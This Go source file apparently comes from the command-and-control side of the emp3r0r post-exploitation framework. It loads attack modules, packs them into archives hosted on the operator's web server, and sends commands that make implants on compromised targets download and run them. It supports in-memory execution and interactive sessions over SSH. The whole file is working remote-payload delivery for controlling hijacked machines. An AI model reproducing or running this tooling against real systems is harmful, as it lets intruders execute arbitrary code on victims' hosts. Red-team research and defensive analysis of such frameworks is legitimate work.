//go:build linux
// +build linux

package cc

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/google/uuid"
	"github.com/jm33-m0/arc"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/olekukonko/tablewriter"
)

// stores module configs
var ModuleConfigs = make(map[string]emp3r0r_def.ModConfig, 1)

// stores module names for fuzzy search
var ModuleNames = make(map[string]string)

// moduleCustom run a custom module
func moduleCustom() {
	go func() {
		config, exists := ModuleConfigs[CurrentMod]
		if !exists {
			CliPrintError("Config of %s does not exist", CurrentMod)
			return
		}

		updateModuleOptions(&config)

		download_addr := getDownloadAddr()

		payload_type, exec_cmd, envStr, err := genModStartCmd(&config)
		if err != nil {
			CliPrintError("Parsing module config: %v", err)
			return
		}

		if config.IsInteractive {
			exec_cmd = fmt.Sprintf("echo %s", strconv.Quote(tun.SHA256SumRaw([]byte(emp3r0r_def.MagicString))))
		}

		if config.InMemory {
			handleInMemoryModule(config, payload_type, download_addr)
			return
		}

		handleCompressedModule(config, payload_type, exec_cmd, envStr, download_addr)
	}()
}

func updateModuleOptions(config *emp3r0r_def.ModConfig) {
	for opt, modOption := range config.Options {
		option, ok := CurrentModuleOptions[opt]
		if !ok {
			CliPrintError("Option '%s' not found", opt)
			return
		}
		modOption.OptVal = option.Val
	}
}

func getDownloadAddr() string {
	download_url_opt, ok := CurrentModuleOptions["download_addr"]
	if ok {
		return download_url_opt.Val
	}
	return ""
}

func handleInMemoryModule(config emp3r0r_def.ModConfig, payload_type, download_addr string) {
	hosted_file := WWWRoot + CurrentMod + ".xz"
	CliPrintInfo("Compressing %s with xz...", CurrentMod)
	path := fmt.Sprintf("%s/%s/%s", config.Path, CurrentMod, config.Exec)
	data, err := os.ReadFile(path)
	if err != nil {
		CliPrintError("Reading %s: %v", path, err)
		return
	}
	compressedBytes, err := arc.CompressXz(data)
	if err != nil {
		CliPrintError("Compressing %s: %v", path, err)
		return
	}
	CliPrintInfo("Created %.4fMB archive (%s) for module '%s'", float64(len(compressedBytes))/1024/1024, hosted_file, CurrentMod)
	err = os.WriteFile(hosted_file, compressedBytes, 0o600)
	if err != nil {
		CliPrintError("Writing %s: %v", hosted_file, err)
		return
	}
	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --download_addr %s",
		emp3r0r_def.C2CmdCustomModule, CurrentMod, payload_type, util.FileBaseName(hosted_file), tun.SHA256SumFile(hosted_file), download_addr)
	cmd_id := uuid.NewString()
	CliPrintDebug("Sending command %s to %s", cmd, CurrentTarget.Tag)
	err = SendCmdToCurrentTarget(cmd, cmd_id)
	if err != nil {
		CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
	}
}

func handleCompressedModule(config emp3r0r_def.ModConfig, payload_type, exec_cmd, envStr, download_addr string) {
	tarball_path := WWWRoot + CurrentMod + ".tar.xz"
	file_to_download := filepath.Base(tarball_path)
	if !util.IsFileExist(tarball_path) {
		CliPrintInfo("Compressing %s with tar.xz...", CurrentMod)
		path := fmt.Sprintf("%s/%s", config.Path, CurrentMod)
		err := util.TarXZ(path, tarball_path)
		if err != nil {
			CliPrintError("Compressing %s: %v", CurrentMod, err)
			return
		}
		CliPrintInfo("Created %.4fMB archive (%s) for module '%s'",
			float64(util.FileSize(tarball_path))/1024/1024, tarball_path, CurrentMod)
	} else {
		CliPrintInfo("Using cached %s", tarball_path)
	}

	checksum := tun.SHA256SumFile(tarball_path)
	cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --env \"%s\" --download_addr %s --type %s --file_to_download %s --exec \"%s\"",
		emp3r0r_def.C2CmdCustomModule,
		CurrentMod, checksum, envStr, download_addr, payload_type, file_to_download, exec_cmd)
	cmd_id := uuid.NewString()
	err := SendCmdToCurrentTarget(cmd, cmd_id)
	if err != nil {
		CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
	}

	if config.IsInteractive {
		handleInteractiveModule(config, cmd_id)
	}
}

func handleInteractiveModule(config emp3r0r_def.ModConfig, cmd_id string) {
	opt, exists := config.Options["args"]
	if !exists {
		config.Options["args"] = &emp3r0r_def.ModOption{
			OptName: "args",
			OptDesc: "run this command with these arguments",
			OptVal:  "",
			OptVals: []string{},
		}
	}
	args := opt.OptVal
	port := strconv.Itoa(util.RandInt(1024, 65535))
	look_for := tun.SHA256SumRaw([]byte(emp3r0r_def.MagicString))

	for i := 0; i < 10; i++ {
		if strings.Contains(CmdResults[cmd_id], look_for) {
			break
		}
		util.TakeABlink()
	}
	defer func() {
		CmdResultsMutex.Lock()
		delete(CmdResults, cmd_id)
		CmdResultsMutex.Unlock()
	}()

	sshErr := SSHClient(fmt.Sprintf("%s/%s/%s",
		RuntimeConfig.AgentRoot, CurrentMod, config.Exec),
		args, port, false)
	if sshErr != nil {
		CliPrintError("module %s: %v", config.Name, sshErr)
	}
}

// Print module meta data
func ModuleDetails(modName string) {
	config, exists := ModuleConfigs[modName]
	if !exists {
		return
	}

	// build table
	tdata := [][]string{}
	tableString := &strings.Builder{}
	table := tablewriter.NewWriter(tableString)
	table.SetHeader([]string{"Name", "Exec", "Platform", "Author", "Date", "Comment"})
	table.SetBorder(true)
	table.SetRowLine(true)
	table.SetAutoWrapText(true)
	table.SetColWidth(20)

	// color
	table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor})

	table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor})

	// fill table
	tdata = append(tdata, []string{config.Name, config.Exec, config.Platform, config.Author, config.Date, config.Comment})
	table.AppendBulk(tdata)
	table.Render()
	out := tableString.String()
	AdaptiveTable(out)
	CliPrintInfo("Module details:\n%s", out)
}

// scan custom modules in ModuleDir,
// and update ModuleHelpers, ModuleDocs
func InitModules() {
	if !util.IsExist(WWWRoot) {
		os.MkdirAll(WWWRoot, 0o700)
	}

	// get vaccine ready
	if !util.IsExist(UtilsArchive) {
		err = CreateVaccineArchive()
		if err != nil {
			CliPrintWarning("CreateVaccineArchive: %v", err)
		}
	}

	load_mod := func(mod_dir string) {
		// don't bother if module dir not found
		if !util.IsExist(mod_dir) {
			return
		}
		CliPrintInfo("Scanning %s for modules", mod_dir)
		dirs, readdirErr := os.ReadDir(mod_dir)
		if readdirErr != nil {
			CliPrintError("Failed to scan custom modules: %v", readdirErr)
			return
		}
		for _, dir := range dirs {
			if !dir.IsDir() {
				continue
			}
			config_file := fmt.Sprintf("%s/%s/config.json", mod_dir, dir.Name())
			if !util.IsExist(config_file) {
				continue
			}
			config, readConfigErr := readModCondig(config_file)
			if readConfigErr != nil {
				CliPrintWarning("Reading config from %s: %v", dir.Name(), readConfigErr)
				continue
			}

			// module path, eg. ~/.emp3r0r/modules
			config.Path = mod_dir

			// add to module helpers
			ModuleHelpers[config.Name] = moduleCustom

			// add module meta data
			emp3r0r_def.Modules[config.Name] = config

			readConfigErr = updateModuleHelp(config)
			if readConfigErr != nil {
				CliPrintWarning("Loading config from %s: %v", config.Name, readConfigErr)
				continue
			}
			ModuleConfigs[config.Name] = *config
			CliPrintInfo("Loaded module %s", strconv.Quote(config.Name))
		}

		// make []string for fuzzysearch
		for name, modObj := range emp3r0r_def.Modules {
			ModuleNames[name] = modObj.Comment
		}
	}

	// read from every defined module dir
	for _, mod_dir := range ModuleDirs {
		load_mod(mod_dir)
	}

	CliPrintInfo("Loaded %d modules", len(ModuleHelpers))
}

// readModCondig read config.json of a module
func readModCondig(file string) (pconfig *emp3r0r_def.ModConfig, err error) {
	// read JSON
	jsonData, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("read %s: %v", file, err)
	}

	// parse the json
	config := emp3r0r_def.ModConfig{}
	err = json.Unmarshal(jsonData, &config)
	if err != nil {
		return nil, fmt.Errorf("failed to unmarshal JSON config: %v", err)
	}
	pconfig = &config
	return
}

// genModStartCmd reads config.json of a module and generates env string (VAR=value,VAR2=value2 ...)
func genModStartCmd(config *emp3r0r_def.ModConfig) (payload_type, exec_path, envStr string, err error) {
	exec_path = config.Exec
	payload_type = config.Type
	var builder strings.Builder

	setEnvVar := func(opt, value string) {
		fmt.Fprintf(&builder, "%s=%s ", opt, value)
	}
	for opt, modOption := range config.Options {
		setEnvVar(opt, modOption.OptVal)
	}

	envStr = builder.String()

	return
}

func updateModuleHelp(config *emp3r0r_def.ModConfig) error {
	help_map := make(map[string]*emp3r0r_def.ModOption)
	for opt, modOption := range config.Options {
		if modOption.OptDesc == "" {
			return fmt.Errorf("%s config error: %s incomplete", config.Name, opt)
		}
		help_map[opt] = modOption
		emp3r0r_def.Modules[config.Name].Options = help_map
	}
	return nil
}
